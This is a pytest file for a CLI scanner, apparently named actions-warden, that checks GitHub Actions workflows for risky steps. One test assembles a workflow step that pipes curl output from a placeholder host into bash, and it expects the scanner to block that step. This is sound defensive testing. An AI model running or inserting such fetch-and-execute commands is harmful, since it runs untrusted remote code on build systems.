import json

from actions_warden.cli import main


def join_parts(*parts):
    return "".join(parts)


def write_workflow(root, name, body):
    wf_dir = root / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    (wf_dir / name).write_text(body)


def test_clean_target_exits_zero(tmp_path, capsys):
    write_workflow(tmp_path, "ci.yml", "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n")
    assert main([str(tmp_path)]) == 0
    assert "No blocking workflow risks" in capsys.readouterr().out


def test_blocked_target_exits_two(tmp_path, capsys):
    sh = join_parts("ba", "sh")
    curl = join_parts("cur", "l")
    write_workflow(tmp_path, "rce.yml", f"on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: {curl} https://x.example | {sh}\n")
    assert main([str(tmp_path)]) == 2
    assert "STOP" in capsys.readouterr().out


def test_json_output_parses(tmp_path, capsys):
    write_workflow(tmp_path, "ci.yml", "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n")
    assert main([str(tmp_path), "--json"]) == 0
    report = json.loads(capsys.readouterr().out)
    assert report["tool"] == "actions-warden"


def test_report_file_written(tmp_path):
    write_workflow(tmp_path, "ci.yml", "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n")
    report_path = tmp_path / "out" / "report.json"
    report_path.parent.mkdir()
    assert main([str(tmp_path), f"--report={report_path}"]) == 0
    report = json.loads(report_path.read_text())
    assert report["tool"] == "actions-warden"


def test_unknown_argument_exits_one(capsys):
    assert main(["--bogus"]) == 1
    assert "Unknown argument" in capsys.readouterr().err


def test_report_without_path_exits_one(capsys):
    assert main(["--report"]) == 1
    assert "requires a file path" in capsys.readouterr().err


def test_help_exits_zero(capsys):
    assert main(["--help"]) == 0
    assert "Exit codes" in capsys.readouterr().out
